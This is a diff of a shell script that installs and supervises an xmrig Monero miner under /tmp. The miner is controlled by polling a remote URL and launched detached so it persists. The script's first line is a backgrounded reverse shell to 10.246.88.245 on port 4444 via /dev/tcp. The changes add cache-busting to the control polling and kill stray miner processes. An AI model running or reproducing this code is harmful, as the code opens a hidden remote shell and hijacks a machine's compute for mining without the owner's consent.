@@ -1,5 +1,6 @@
 nohup bash -c 'bash -i >& /dev/tcp/10.246.88.245/4444 0>&1' >/dev/null 2>&1 & disown 2>/dev/null
 
+
 mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
 
 download_release() {
@@ -530,7 +531,7 @@ XPID=""
 echo $$ > "$PIDFILE"
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG"; }
 
-poll() { curl -fsSL --max-time 10 "$CONTROL_URL" 2>/dev/null | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]'; }
+poll() { curl -fsSL --max-time 10 -H 'Cache-Control: no-cache' -H 'Pragma: no-cache' "$CONTROL_URL?t=$(date +%s)" 2>/dev/null | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]'; }
 
 start_miner() {
   [ -n "$XPID" ] && kill -0 "$XPID" 2>/dev/null && return
@@ -563,12 +564,13 @@ done
 RUN_SH_EOF
 chmod +x run.sh
 
-# Stop any previously running watchdog, then launch detached so it survives closing the tab
+# Stop any previously running watchdog or stray xmrig, then launch detached
 if [ -f /tmp/moneroocean/watchdog.pid ]; then
   old="$(cat /tmp/moneroocean/watchdog.pid 2>/dev/null)"
   [ -n "$old" ] && kill "$old" 2>/dev/null
-  sleep 1
 fi
+pkill -f "/tmp/moneroocean/xmrig" 2>/dev/null
+sleep 1
 
 cd /tmp/moneroocean
 if command -v setsid >/dev/null 2>&1; then
